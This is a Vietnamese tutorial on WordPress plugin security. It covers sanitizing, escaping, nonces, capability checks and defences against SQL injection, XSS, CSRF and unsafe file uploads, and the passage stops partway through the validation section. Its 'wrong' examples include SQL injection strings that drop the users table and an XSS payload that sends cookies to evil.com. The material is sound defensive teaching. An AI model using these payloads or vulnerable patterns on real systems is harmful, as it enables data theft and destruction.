# Bao mat Plugin WordPress

## Muc luc

1. [Nguyen tac bao mat trong Plugin](#1-nguyen-tac-bao-mat-trong-plugin)
2. [Sanitize Input](#2-sanitize-input)
3. [Escape Output](#3-escape-output)
4. [Nonces - Chong CSRF](#4-nonces---chong-csrf)
5. [Capability Checks](#5-capability-checks)
6. [SQL Injection Prevention](#6-sql-injection-prevention)
7. [XSS Prevention](#7-xss-prevention)
8. [CSRF Prevention](#8-csrf-prevention)
9. [File Upload Security](#9-file-upload-security)
10. [Data Validation](#10-data-validation)
11. [Code vi du cho tung loai bao mat](#11-code-vi-du-cho-tung-loai-bao-mat)
12. [Best Practices](#12-best-practices)

---

## 1. Nguyen tac bao mat trong Plugin

### 3 Nguyen tac vang

```
1. KHONG BAO GIO tin tuong du lieu tu nguoi dung
   - Tat ca input la nguy hiem cho den khi duoc lam sach
   - $_GET, $_POST, $_REQUEST, $_COOKIE, $_SERVER, $_FILES
   - Form data, AJAX data, URL parameters, HTTP headers

2. LUON LUON:
   - Sanitize INPUT (khi nhan du lieu)
   - Validate DATA (kiem tra hop le)
   - Escape OUTPUT (khi hien thi)

3. NGUYEN TAC TOI THIEU QUYEN (Least Privilege):
   - Chi cap quyen toi thieu can thiet
   - Kiem tra quyen truoc MOI hanh dong
```

### Luong xu ly du lieu an toan

```
Nguoi dung nhap       Sanitize       Validate       Luu DB
[Form Input] -----> [Lam sach] ----> [Kiem tra] ----> [Database]
                    remove tags      is_email?        prepare()
                    trim spaces      length OK?
                    escape chars     range OK?

Doc tu DB            Escape           Hien thi
[Database] -------> [Ma hoa] ------> [Browser]
                    esc_html()        An toan
                    esc_attr()        Khong bi XSS
                    esc_url()
```

### So sanh voi Laravel

```
Laravel                          WordPress
Form Request + Validation  =>    Sanitize + Validate thu cong
CSRF Token (tu dong)       =>    Nonces (thu cong)
Middleware (auth, etc.)    =>    current_user_can()
Eloquent (tu escape)       =>    $wpdb->prepare()
Blade {{ }} (tu escape)    =>    esc_html(), esc_attr()
{!! !!} (raw output)       =>    wp_kses_post()
```

---

## 2. Sanitize Input

### Toan bo ham Sanitize cua WordPress

```php
<?php
/**
 * SANITIZE = Lam sach du lieu dau vao.
 * Ap dung NGAY KHI NHAN du lieu tu nguoi dung.
 * Loai bo cac ky tu nguy hiem, dinh dang lai du lieu.
 */

// === TEXT ===

// sanitize_text_field() - Lam sach text 1 dong
// Xoa: HTML tags, xuong dong, tab, khoang trang thua
$name = sanitize_text_field( $_POST['name'] );
// Input:  " <script>alert(1)</script>Nguyen Van A  "
// Output: "Nguyen Van A"

// sanitize_textarea_field() - Lam sach text nhieu dong
// Giong sanitize_text_field NHUNG giu lai xuong dong (\n)
$bio = sanitize_textarea_field( $_POST['bio'] );
// Input:  "<b>Dong 1</b>\nDong 2<script>alert(1)</script>"
// Output: "Dong 1\nDong 2"

// sanitize_title() - Tao slug
$slug = sanitize_title( 'Bai Viet Cua Toi!' );
// Output: "bai-viet-cua-toi"

// sanitize_key() - Tao key an toan (chi a-z, 0-9, -, _)
$key = sanitize_key( 'My Option Key!' );
// Output: "my_option_key"

// sanitize_html_class() - Lam sach CSS class name
$class = sanitize_html_class( 'my-class <script>' );
// Output: "my-classscript"

// === EMAIL ===

// sanitize_email() - Chi giu lai ky tu hop le cho email
$email = sanitize_email( 'user<script>@example.com' );
// Output: "user@example.com"

// === URL ===

// sanitize_url() (WP 5.9+) hoac esc_url_raw()
// Lam sach URL de luu vao database
$url = sanitize_url( 'https://example.com/page?foo=bar&baz=<script>' );

// esc_url_raw() - Lam sach URL cho database (khong encode &)
$url_db = esc_url_raw( $_POST['website'] );

// === SO ===

// absint() - So nguyen duong tuyet doi
$count = absint( $_POST['count'] );     // "-5" => 5, "abc" => 0
// intval() - So nguyen (co the am)
$offset = intval( $_POST['offset'] );   // "-5" => -5
// floatval() - So thuc
$price = floatval( $_POST['price'] );   // "19.99abc" => 19.99

// === FILE ===

// sanitize_file_name() - Lam sach ten file
$filename = sanitize_file_name( '../../../etc/passwd' );
// Output: "etc-passwd" (xoa ky tu traversal)

// sanitize_mime_type() - Lam sach MIME type
$mime = sanitize_mime_type( $_FILES['file']['type'] );

// === HTML ===

// wp_strip_all_tags() - Xoa TAT CA tags HTML
$text = wp_strip_all_tags( '<p>Hello <strong>World</strong></p>' );
// Output: "Hello World"

// wp_kses() - Chi cho phep cac tags HTML cu the
$allowed = array(
    'a'      => array( 'href' => array(), 'title' => array() ),
    'strong' => array(),
    'em'     => array(),
    'br'     => array(),
);
$safe_html = wp_kses( $_POST['content'], $allowed );
// Xoa tat ca tags khong co trong $allowed

// wp_kses_post() - Cho phep HTML an toan nhu bai viet
// Bao gom: p, a, img, h1-h6, ul, ol, li, strong, em, blockquote, v.v.
$content = wp_kses_post( $_POST['content'] );

// wp_kses_data() - Chi cho phep HTML trong attribute
// Rat han che

// === MAU SAC ===

// sanitize_hex_color() - Kiem tra va tra ve ma mau hex
$color = sanitize_hex_color( $_POST['color'] );
// "#ff0000" => "#ff0000", "not-a-color" => null

// sanitize_hex_color_no_hash() - Khong co dau #
$color_no_hash = sanitize_hex_color_no_hash( $_POST['color'] );
```

---

## 3. Escape Output

### Toan bo ham Escape cua WordPress

```php
<?php
/**
 * ESCAPE = Ma hoa du lieu khi HIEN THI.
 * Ngan browser thuc thi code doc hai.
 * Ap dung NGAY TRUOC KHI echo/output.
 *
 * NGUYEN TAC: "Escape late" - Escape cang muon cang tot (ngay truoc output)
 */

// === esc_html() - Escape cho noi dung HTML ===
// Chuyen doi: < > & " ' thanh HTML entities
// Dung trong: text node, noi dung the HTML

$user_name = '<script>alert("XSS")</script>';

// SAI - Bi XSS!
echo $user_name;
// Output: <script>alert("XSS")</script> => Browser thuc thi script!

// DUNG
echo esc_html( $user_name );
// Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// Browser hien thi text, KHONG thuc thi script

// Vi du thuc te
echo '<p>Xin chao, ' . esc_html( $user_name ) . '</p>';
echo '<h1>' . esc_html( get_the_title() ) . '</h1>';

// === esc_attr() - Escape cho HTML attributes ===
// Dung trong: value, title, alt, class, id, data-*

$value = '" onmouseover="alert(1)" data-x="';

// SAI
echo '<input value="' . $value . '">';
// Output: <input value="" onmouseover="alert(1)" data-x="">
// => Them event handler doc hai!

// DUNG
echo '<input value="' . esc_attr( $value ) . '">';
// Output: <input value="&quot; onmouseover=&quot;alert(1)&quot; data-x=&quot;">
// => An toan, hien thi nhu text

// Vi du thuc te
echo '<input type="text" name="email" value="' . esc_attr( $email ) . '">';
echo '<div class="' . esc_attr( $css_class ) . '">';
echo '<a title="' . esc_attr( $tooltip ) . '">';
echo '<div data-id="' . esc_attr( $item_id ) . '">';

// === esc_url() - Escape cho URLs ===
// Kiem tra protocol (chi cho phep http, https, ftp, mailto, tel, v.v.)
// Loai bo javascript:, data:, v.v.

$url = 'javascript:alert("XSS")';

// SAI
echo '<a href="' . $url . '">Click</a>';
// => Click se thuc thi JavaScript!

// DUNG
echo '<a href="' . esc_url( $url ) . '">Click</a>';
// Output: <a href="">Click</a>
// => URL bi xoa vi protocol nguy hiem

// Vi du thuc te
echo '<a href="' . esc_url( $link ) . '">Truy cap</a>';
echo '<img src="' . esc_url( $image_url ) . '">';
echo '<form action="' . esc_url( admin_url( 'admin-post.php' ) ) . '">';

// Cho phep protocols tuy chinh
echo esc_url( $url, array( 'http', 'https', 'tel', 'skype' ) );

// === esc_js() - Escape cho inline JavaScript ===
$message = "Hello 'World' \"Test\"";

echo '<script>alert("' . esc_js( $message ) . '")</script>';
// Output: <script>alert("Hello \'World\' \"Test\"")</script>

// Vi du thuc te
echo '<button onclick="alert(\'' . esc_js( $message ) . '\')">';

// === esc_textarea() - Escape cho noi dung textarea ===
$text = '<script>alert(1)</script>Hello';

echo '<textarea>' . esc_textarea( $text ) . '</textarea>';
// Noi dung hien thi an toan trong textarea

// === wp_kses_post() - Escape HTML nhu bai viet ===
// Cho phep HTML an toan, xoa nguy hiem
$content = wp_kses_post( $raw_html );
echo $content; // An toan vi da duoc loc

// === wp_kses() - Escape HTML tuy chinh ===
$allowed_tags = array(
    'a'      => array( 'href' => true, 'title' => true, 'target' => true ),
    'strong' => array(),
    'em'     => array(),
    'p'      => array( 'class' => true ),
);
echo wp_kses( $html_content, $allowed_tags );
```

### Bang tom tat: Khi nao dung ham nao?

```
+------------------+-----------------------------+------------------------+
| Ngu canh         | Ham escape                  | Vi du                  |
+------------------+-----------------------------+------------------------+
| Text trong HTML  | esc_html()                  | <p>TEXT</p>            |
| HTML attribute   | esc_attr()                  | <input value="ATTR">   |
| URL (href, src)  | esc_url()                   | <a href="URL">         |
| Inline JS        | esc_js()                    | onclick="FN('JS')"     |
| Textarea value   | esc_textarea()              | <textarea>TEXT</textarea>|
| Safe HTML        | wp_kses_post()              | Noi dung bai viet      |
| Custom HTML      | wp_kses($html, $allowed)    | HTML tuy chinh         |
| URL cho DB       | esc_url_raw()               | Luu URL vao database   |
+------------------+-----------------------------+------------------------+
```

---

## 4. Nonces - Chong CSRF

```php
<?php
/**
 * NONCE = "Number used Once" (thuc te la hash string, khong phai so)
 * Bao ve khoi CSRF (Cross-Site Request Forgery).
 *
 * CSRF la gi?
 * Ke tan cong dua nan nhan click link/form gui request den site cua ban
 * Nonce chung minh request den tu trang cua ban, khong phai tu site khac
 *
 * So sanh voi Laravel:
 * Laravel: @csrf trong Blade => tu dong sinh _token
 * WordPress: wp_nonce_field() => thu cong them vao form
 */

// === TRONG FORM ===

// TAO nonce cho form
function render_my_form() {
    ?>
    <form method="post" action="">
        <?php
        /**
         * wp_nonce_field() - Tao hidden input chua nonce
         *
         * @param string $action   Hanh dong (bat ky chuoi nao)
         * @param string $name     Ten truong hidden (mac dinh: _wpnonce)
         * @param bool   $referer  Them referrer field (mac dinh: true)
         * @param bool   $echo     Echo hay return (mac dinh: true)
         */
        wp_nonce_field( 'my_form_save', 'my_form_nonce' );
        // Output: <input type="hidden" name="my_form_nonce" value="a1b2c3d4e5">
        //         <input type="hidden" name="_wp_http_referer" value="/wp-admin/...">
        ?>

        <input type="text" name="title" value="">
        <button type="submit">Luu</button>
    </form>
    <?php
}

// KIEM TRA nonce khi xu ly form
function handle_my_form() {
    if ( ! isset( $_POST['my_form_nonce'] ) ) {
        return;
    }

    /**
     * wp_verify_nonce() - Kiem tra nonce co hop le khong
     *
     * @param string $nonce  Gia tri nonce tu form
     * @param string $action Hanh dong (phai khop voi wp_nonce_field)
     *
     * @return int|false
     *   1 = nonce duoi 12 gio (moi)
     *   2 = nonce 12-24 gio (cu nhung con hop le)
     *   false = khong hop le
     */
    if ( ! wp_verify_nonce( $_POST['my_form_nonce'], 'my_form_save' ) ) {
        wp_die( 'Xac thuc bao mat that bai!' );
    }

    // Nonce hop le, xu ly tiep...
    $title = sanitize_text_field( $_POST['title'] );
}

// CACH NGAN GON: check_admin_referer()
function handle_my_form_short() {
    /**
     * check_admin_referer() - Kiem tra nonce + referer
     * Tu dong die() neu that bai
     *
     * @param string $action    Hanh dong
     * @param string $query_arg Ten truong (mac dinh: _wpnonce)
     */
    check_admin_referer( 'my_form_save', 'my_form_nonce' );
    // Neu nonce sai => Tu dong hien trang loi 403 va die()

    // Code xu ly chi chay khi nonce dung
}

// === TRONG URL ===

// TAO URL co nonce
$delete_url = wp_nonce_url(
    admin_url( 'admin.php?page=my-plugin&action=delete&id=5' ),
    'delete_item_5'         // Action (nen bao gom ID de duy nhat)
);
// URL: admin.php?page=my-plugin&action=delete&id=5&_wpnonce=a1b2c3

echo '<a href="' . esc_url( $delete_url ) . '">Xoa</a>';

// KIEM TRA nonce tu URL
if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
    $id = absint( $_GET['id'] );
    check_admin_referer( 'delete_item_' . $id );
    // Xu ly xoa...
}

// === TRONG AJAX ===

// PHP: Tao nonce va gui sang JS
wp_localize_script( 'my-script', 'myData', array(
    'nonce' => wp_create_nonce( 'my_ajax_action' ),
));

// JS: Gui nonce kem AJAX
// $.post(ajaxUrl, { action: 'my_action', nonce: myData.nonce, ... });

// PHP: Kiem tra nonce tu AJAX
add_action( 'wp_ajax_my_action', function() {
    check_ajax_referer( 'my_ajax_action', 'nonce' );
    // Xu ly...
    wp_send_json_success();
});
```

---

## 5. Capability Checks

```php
<?php
/**
 * CAPABILITY CHECK = Kiem tra quyen cua nguoi dung
 * Dam bao nguoi dung co quyen thuc hien hanh dong.
 *
 * Phai kiem tra quyen TRUOC moi hanh dong quan trong.
 *
 * So sanh voi Laravel:
 * Laravel: Gate::allows(), @can, Policy
 * WordPress: current_user_can()
 */

// === current_user_can() ===

/**
 * current_user_can() - Kiem tra nguoi dung hien tai co quyen khong
 *
 * @param string $capability  Ten quyen
 * @param mixed  ...$args     Tham so them (vi du: post_id)
 * @return bool
 */

// Kiem tra truoc khi lam bat ky gi
function my_admin_action() {
    // Quyen quan tri toan bo
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Ban khong co quyen thuc hien hanh dong nay.' );
    }
    // Xu ly...
}

// === CÁC QUYEN THUONG DUNG ===

// --- Quyen lien quan Posts ---
current_user_can( 'edit_posts' );          // Sua bai viet cua minh
current_user_can( 'edit_others_posts' );   // Sua bai cua nguoi khac
current_user_can( 'publish_posts' );       // Xuat ban bai viet
current_user_can( 'delete_posts' );        // Xoa bai viet
current_user_can( 'edit_post', $post_id ); // Sua 1 bai cu the

// --- Quyen lien quan Pages ---
current_user_can( 'edit_pages' );
current_user_can( 'publish_pages' );

// --- Quyen quan tri ---
current_user_can( 'manage_options' );      // Quan ly cai dat (Admin)
current_user_can( 'activate_plugins' );    // Kich hoat plugin
current_user_can( 'edit_theme_options' );  // Tuy chinh theme
current_user_can( 'manage_categories' );   // Quan ly danh muc
current_user_can( 'moderate_comments' );   // Quan ly binh luan
current_user_can( 'upload_files' );        // Upload file
current_user_can( 'install_plugins' );     // Cai plugin moi
current_user_can( 'create_users' );        // Tao user moi

// --- Quyen nguoi dung ---
current_user_can( 'read' );                // Doc noi dung (tat ca user)
current_user_can( 'edit_user', $user_id ); // Sua user cu the

// === ROLES VA CAPABILITIES ===

// Roles mac dinh va quyen cua chung:
// Administrator: Toan quyen
// Editor:        edit_others_posts, publish_posts, manage_categories, moderate_comments
// Author:        edit_posts (cua minh), publish_posts, upload_files
// Contributor:   edit_posts (cua minh), KHONG publish
// Subscriber:    read

// === TAO CUSTOM CAPABILITY ===

// Them custom capability khi activate
register_activation_hook( __FILE__, function() {
    // Them quyen moi cho admin
    $admin = get_role( 'administrator' );
    if ( $admin ) {
        $admin->add_cap( 'manage_my_plugin' );
        $admin->add_cap( 'edit_my_plugin_items' );
        $admin->add_cap( 'delete_my_plugin_items' );
    }

    // Them quyen cho editor
    $editor = get_role( 'editor' );
    if ( $editor ) {
        $editor->add_cap( 'edit_my_plugin_items' );
    }
});

// Xoa custom capability khi uninstall
// Trong uninstall.php:
// $admin = get_role( 'administrator' );
// $admin->remove_cap( 'manage_my_plugin' );

// Su dung custom capability
if ( current_user_can( 'manage_my_plugin' ) ) {
    // Admin co the truy cap
}

if ( current_user_can( 'edit_my_plugin_items' ) ) {
    // Admin va Editor co the truy cap
}

// === VI DU THUC TE ===

// Trong menu: an menu neu khong co quyen
add_action( 'admin_menu', function() {
    add_menu_page(
        'My Plugin',
        'My Plugin',
        'manage_my_plugin',     // <-- CHI USER CO QUYEN NAY MOI THAY MENU
        'my-plugin',
        'my_plugin_page'
    );
});

// Trong AJAX
add_action( 'wp_ajax_delete_item', function() {
    check_ajax_referer( 'my_nonce', 'nonce' );

    // Kiem tra quyen cụ the
    if ( ! current_user_can( 'delete_my_plugin_items' ) ) {
        wp_send_json_error( array( 'message' => 'Khong co quyen xoa.' ), 403 );
    }

    // Xu ly xoa...
    wp_send_json_success();
});

// Trong REST API
register_rest_route( 'my/v1', '/items', array(
    'methods'  => 'DELETE',
    'callback' => 'handle_delete',
    'permission_callback' => function() {
        return current_user_can( 'delete_my_plugin_items' );
    },
));
```

---

## 6. SQL Injection Prevention

```php
<?php
/**
 * SQL INJECTION la gi?
 * Ke tan cong chen code SQL vao input de doc/sua/xoa database.
 *
 * Vi du:
 * Input: ' OR 1=1 --
 * Query: SELECT * FROM users WHERE email = '' OR 1=1 --'
 * Ket qua: Lay TOAN BO users!
 */

global $wpdb;
$table = $wpdb->prefix . 'my_items';

// ============================================
// SAI - DEO BI SQL INJECTION!
// ============================================

// Truong hop 1: Noi truc tiep bien vao query
$id = $_GET['id']; // Gia su: "1 OR 1=1"
$result = $wpdb->get_row( "SELECT * FROM {$table} WHERE id = {$id}" );
// Query: SELECT * FROM wp_my_items WHERE id = 1 OR 1=1
// => Lay tat ca rows!

// Truong hop 2: Noi chuoi
$email = $_POST['email']; // Gia su: "'; DROP TABLE wp_users; --"
$wpdb->query( "DELETE FROM {$table} WHERE email = '{$email}'" );
// Query: DELETE FROM wp_my_items WHERE email = ''; DROP TABLE wp_users; --'
// => XOA BANG USERS!

// Truong hop 3: LIKE injection
$search = $_GET['s']; // Gia su: "%"
$wpdb->get_results( "SELECT * FROM {$table} WHERE name LIKE '%{$search}%'" );
// => Lay tat ca du lieu!

// ============================================
// DUNG - AN TOAN!
// ============================================

// Cach 1: $wpdb->prepare() (BAT BUOC cho moi query co bien)
$id = absint( $_GET['id'] );
$result = $wpdb->get_row(
    $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $id )
);
// %d tu dong chuyen sang integer, khong the inject

$email = sanitize_email( $_POST['email'] );
$wpdb->query(
    $wpdb->prepare( "DELETE FROM {$table} WHERE email = %s", $email )
);
// %s tu dong escape quotes

// Cach 2: LIKE voi esc_like()
$search = sanitize_text_field( $_GET['s'] );
$like = '%' . $wpdb->esc_like( $search ) . '%';
$results = $wpdb->get_results(
    $wpdb->prepare( "SELECT * FROM {$table} WHERE name LIKE %s", $like )
);
// esc_like() escape: %, _, \ trong gia tri LIKE

// Cach 3: IN clause an toan
$ids = array_map( 'absint', (array) $_POST['ids'] );
if ( ! empty( $ids ) ) {
    $placeholders = implode( ', ', array_fill( 0, count( $ids ), '%d' ) );
    $results = $wpdb->get_results(
        $wpdb->prepare(
            "SELECT * FROM {$table} WHERE id IN ({$placeholders})",
            ...$ids
        )
    );
}

// Cach 4: Dung $wpdb->insert(), update(), delete() (tu dong escape)
$wpdb->insert(
    $table,
    array( 'name' => $name, 'email' => $email ),
    array( '%s', '%s' )
);
// Cac ham nay tu dong escape gia tri

// Cach 5: Whitelisting cho ORDER BY, ten cot
$allowed_columns = array( 'id', 'name', 'email', 'created_at' );
$orderby = in_array( $_GET['orderby'] ?? '', $allowed_columns )
    ? $_GET['orderby']
    : 'id'; // Mac dinh an toan

$allowed_orders = array( 'ASC', 'DESC' );
$order = in_array( strtoupper( $_GET['order'] ?? '' ), $allowed_orders )
    ? strtoupper( $_GET['order'] )
    : 'DESC';

// An toan vi orderby va order chi co the la gia tri trong whitelist
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$table} ORDER BY {$orderby} {$order} LIMIT %d",
        10
    )
);
```

---

## 7. XSS Prevention

```php
<?php
/**
 * XSS (Cross-Site Scripting) la gi?
 * Ke tan cong chen JavaScript vao trang web de:
 * - Danh cap cookie/session
 * - Redirect nguoi dung
 * - Thay doi noi dung trang
 *
 * Phong chong: LUON escape output
 */

// ============================================
// STORED XSS - Du lieu doc tu database
// ============================================

// SAI - Bi XSS!
$user = $wpdb->get_row( "SELECT * FROM wp_users WHERE ID = 1" );
echo '<h1>Chao mung, ' . $user->display_name . '</h1>';
// Neu display_name = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
// => Cookie bi danh cap!

// DUNG
echo '<h1>Chao mung, ' . esc_html( $user->display_name ) . '</h1>';

// ============================================
// REFLECTED XSS - Du lieu tu URL
// ============================================

// SAI
echo '<p>Ket qua tim kiem: ' . $_GET['s'] . '</p>';
// URL: ?s=<script>alert('XSS')</script>

// DUNG
echo '<p>Ket qua tim kiem: ' . esc_html( sanitize_text_field( $_GET['s'] ) ) . '</p>';

// ============================================
// VI DU TONG HOP
// ============================================

// Hien thi du lieu trong HTML
echo '<div class="profile">';
echo '  <h2>' . esc_html( $user->name ) . '</h2>';
echo '  <p>' . esc_html( $user->bio ) . '</p>';
echo '  <a href="' . esc_url( $user->website ) . '">' . esc_html( $user->website ) . '</a>';
echo '</div>';

// Hien thi du lieu trong attributes
echo '<input type="text" value="' . esc_attr( $value ) . '">';
echo '<div data-id="' . esc_attr( $item_id ) . '" title="' . esc_attr( $tooltip ) . '">';

// Hien thi HTML cho phep (bai viet)
echo '<div class="content">';
echo wp_kses_post( $post_content ); // Loc HTML nguy hiem, giu HTML an toan
echo '</div>';

// JavaScript inline an toan
$data = array( 'name' => $user->name, 'id' => $user->ID );
echo '<script>var userData = ' . wp_json_encode( $data ) . ';</script>';
// wp_json_encode tu dong escape cac ky tu nguy hiem trong JSON
```

---

## 8. CSRF Prevention

```php
<?php
/**
 * CSRF (Cross-Site Request Forgery)
 * Ke tan cong lua nguoi dung thuc hien hanh dong khong mong muon.
 *
 * Vi du tan cong:
 * Trang evil.com co form an gui POST den yoursite.com/wp-admin/...
 * Neu admin dang login va truy cap evil.com, form se tu dong gui
 * va thuc hien hanh dong tren yoursite.com!
 *
 * Phong chong: Dung NONCE cho moi form va action
 */

// === TRONG FORM: wp_nonce_field ===
function render_settings_form() {
    ?>
    <form method="post" action="">
        <?php wp_nonce_field( 'save_settings', '_settings_nonce' ); ?>
        <input type="text" name="option_value" value="">
        <button type="submit" name="save">Luu</button>
    </form>
    <?php
}

function process_settings_form() {
    if ( ! isset( $_POST['save'] ) ) return;

    // Kiem tra CSRF nonce
    if ( ! wp_verify_nonce( $_POST['_settings_nonce'] ?? '', 'save_settings' ) ) {
        wp_die( 'CSRF check that bai! Request khong hop le.' );
    }

    // Kiem tra quyen
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Khong co quyen.' );
    }

    // An toan de xu ly
    $value = sanitize_text_field( $_POST['option_value'] );
    update_option( 'my_option', $value );
}

// === TRONG URL: wp_nonce_url ===
$delete_link = wp_nonce_url(
    admin_url( 'admin.php?page=my-plugin&action=delete&id=' . $item_id ),
    'delete_item_' . $item_id,
    '_delete_nonce'
);
echo '<a href="' . esc_url( $delete_link ) . '"
       onclick="return confirm(\'Ban co chac muon xoa?\')">Xoa</a>';

// Xu ly delete
if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
    $id = absint( $_GET['id'] );
    // Kiem tra nonce (tu dong die neu sai)
    check_admin_referer( 'delete_item_' . $id, '_delete_nonce' );
    // An toan de xoa
}

// === TRONG AJAX ===
// Tao: wp_create_nonce('my_nonce') => gui sang JS
// Kiem tra: check_ajax_referer('my_nonce', 'security')

// === TRONG REST API ===
// Nonce: X-WP-Nonce header
// Tao: wp_create_nonce('wp_rest')
// WordPress tu dong kiem tra khi dung cookie auth
```

---

## 9. File Upload Security

```php
<?php
/**
 * Upload file an toan trong WordPress plugin.
 * Can kiem tra: loai file, kich thuoc, ten file, quyen.
 */

function handle_secure_upload() {
    // 1. Kiem tra quyen
    if ( ! current_user_can( 'upload_files' ) ) {
        wp_die( 'Khong co quyen upload.' );
    }

    // 2. Kiem tra nonce
    check_admin_referer( 'my_upload_action', 'upload_nonce' );

    // 3. Kiem tra co file khong
    if ( empty( $_FILES['my_file'] ) || $_FILES['my_file']['error'] !== UPLOAD_ERR_OK ) {
        wp_die( 'Khong co file hoac loi upload.' );
    }

    $file = $_FILES['my_file'];

    // 4. Kiem tra kich thuoc (5MB max)
    $max_size = 5 * 1024 * 1024; // 5MB
    if ( $file['size'] > $max_size ) {
        wp_die( 'File qua lon. Toi da 5MB.' );
    }

    // 5. Kiem tra loai file (MIME type)
    // QUAN TRONG: Khong tin $_FILES['type'] - do client gui, co the gia mao!
    $allowed_types = array(
        'image/jpeg' => 'jpg',
        'image/png'  => 'png',
        'image/gif'  => 'gif',
        'application/pdf' => 'pdf',
    );

    // Dung wp_check_filetype de kiem tra thuc su
    $file_info = wp_check_filetype( $file['name'], $allowed_types );

    if ( empty( $file_info['ext'] ) || empty( $file_info['type'] ) ) {
        wp_die( 'Loai file khong duoc phep. Chi chap nhan: JPG, PNG, GIF, PDF.' );
    }

    // 6. Kiem tra noi dung file (double check)
    // Doi voi hinh anh, kiem tra bang getimagesize
    if ( strpos( $file_info['type'], 'image/' ) === 0 ) {
        $image_info = getimagesize( $file['tmp_name'] );
        if ( false === $image_info ) {
            wp_die( 'File khong phai la hinh anh hop le.' );
        }
    }

    // 7. Lam sach ten file
    $safe_filename = sanitize_file_name( $file['name'] );

    // 8. Su dung wp_handle_upload (cach an toan nhat)
    // Ham nay tu dong:
    // - Kiem tra MIME type
    // - Di chuyen file vao thu muc uploads
    // - Tao ten file duy nhat (tranh trung)
    // - Tra ve URL va duong dan

    // Phai include file nay truoc khi dung wp_handle_upload
    if ( ! function_exists( 'wp_handle_upload' ) ) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
    }

    $upload_overrides = array(
        'test_form' => false,  // Khong kiem tra form (vi ta xu ly thu cong)
        'mimes'     => $allowed_types,  // Chi cho phep MIME types nay
    );

    $result = wp_handle_upload( $file, $upload_overrides );

    if ( isset( $result['error'] ) ) {
        wp_die( 'Loi upload: ' . esc_html( $result['error'] ) );
    }

    // Thanh cong!
    // $result['file'] = /var/www/html/wp-content/uploads/2024/01/filename.jpg
    // $result['url']  = https://example.com/wp-content/uploads/2024/01/filename.jpg
    // $result['type'] = image/jpeg

    // 9. Tuy chon: Them vao Media Library
    $attachment_id = wp_insert_attachment(
        array(
            'guid'           => $result['url'],
            'post_mime_type' => $result['type'],
            'post_title'     => pathinfo( $safe_filename, PATHINFO_FILENAME ),
            'post_content'   => '',
            'post_status'    => 'inherit',
        ),
        $result['file']
    );

    // Tao metadata cho attachment (thumbnail, sizes)
    if ( ! function_exists( 'wp_generate_attachment_metadata' ) ) {
        require_once ABSPATH . 'wp-admin/includes/image.php';
    }
    $metadata = wp_generate_attachment_metadata( $attachment_id, $result['file'] );
    wp_update_attachment_metadata( $attachment_id, $metadata );

    return $attachment_id;
}

// Form upload
function render_upload_form() {
    ?>
    <form method="post" enctype="multipart/form-data">
        <?php wp_nonce_field( 'my_upload_action', 'upload_nonce' ); ?>
        <input type="file" name="my_file" accept=".jpg,.jpeg,.png,.gif,.pdf">
        <button type="submit">Upload</button>
    </form>
    <?php
}
```

---

## 10. Data Validation

```php
<?php
/**
 * VALIDATION = Kiem tra du lieu co hop le khong.
 * Khac voi Sanitize (lam sach), Validate kiem tra logic.
 *
 * Sanitize: Loai bo ky tu xau => "abc<script>" -> "abc"
 * Validate: Kiem tra dung dinh dang => "abc@" -> FALSE (khong phai email)
 */

function validate_contact_form( array $data ): array {
    $errors = array();

    // === REQUIRED (bat buoc) ===
    if ( empty( $data['name'] ) ) {
        $errors['name'] = 'Ten la bat buoc.';
    }

    // === LENGTH (do dai) ===
    if ( strlen( $data['name'] ) > 100 ) {
        $errors['name'] = 'Ten khong duoc qua 100 ky tu.';
    }

    if ( strlen( $data['name'] ) < 2 ) {
        $errors['name'] = 'Ten phai co it nhat 2 ky tu.';
    }

    // === EMAIL ===
    if ( empty( $data['email'] ) ) {
        $errors['email'] = 'Email la bat buoc.';
    } elseif ( ! is_email( $data['email'] ) ) {
        // is_email() la ham WordPress kiem tra email hop le
        $errors['email'] = 'Email khong hop le.';
    }

    // === URL ===
    if ( ! empty( $data['website'] ) ) {
        // wp_http_validate_url kiem tra URL co the truy cap
        if ( ! filter_var( $data['website'], FILTER_VALIDATE_URL ) ) {
            $errors['website'] = 'URL khong hop le.';
        }
    }

    // === SO (Range) ===
    if ( ! empty( $data['age'] ) ) {
        $age = intval( $data['age'] );
        if ( $age < 1 || $age > 150 ) {
            $errors['age'] = 'Tuoi phai tu 1 den 150.';
        }
    }

    // === ENUM (Gia tri trong danh sach) ===
    $valid_statuses = array( 'active', 'inactive', 'pending' );
    if ( ! in_array( $data['status'], $valid_statuses, true ) ) {
        $errors['status'] = 'Trang thai khong hop le.';
    }

    // === PHONE ===
    if ( ! empty( $data['phone'] ) ) {
        // Chi cho phep so, dau +, dau -, khoang trang
        if ( ! preg_match( '/^[\d\+\-\s\(\)]{8,20}$/', $data['phone'] ) ) {
            $errors['phone'] = 'So dien thoai khong hop le.';
        }
    }

    // === DATE ===
    if ( ! empty( $data['birthday'] ) ) {
        $date = DateTime::createFromFormat( 'Y-m-d', $data['birthday'] );
        if ( ! $date || $date->format( 'Y-m-d' ) !== $data['birthday'] ) {
            $errors['birthday'] = 'Ngay sinh khong hop le (YYYY-MM-DD).';
        }
    }

    // === UNIQUE (kiem tra trung trong database) ===
    if ( ! empty( $data['email'] ) && empty( $errors['email'] ) ) {
        global $wpdb;
        $exists = $wpdb->get_var(
            $wpdb->prepare(
                "SELECT COUNT(*) FROM {$wpdb->prefix}contacts WHERE email = %s AND id != %d",
                $data['email'],
                $data['id'] ?? 0
            )
        );
        if ( $exists > 0 ) {
            $errors['email'] = 'Email nay da duoc su dung.';
        }
    }

    // === FILE UPLOAD ===
    if ( ! empty( $_FILES['avatar'] ) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK ) {
        $allowed_types = array( 'image/jpeg', 'image/png' );
        $max_size = 2 * 1024 * 1024; // 2MB

        $file_info = wp_check_filetype( $_FILES['avatar']['name'] );
        if ( ! in_array( $file_info['type'], $allowed_types ) ) {
            $errors['avatar'] = 'Chi chap nhan file JPG hoac PNG.';
        }

        if ( $_FILES['avatar']['size'] > $max_size ) {
            $errors['avatar'] = 'File qua lon. Toi da 2MB.';
        }
    }

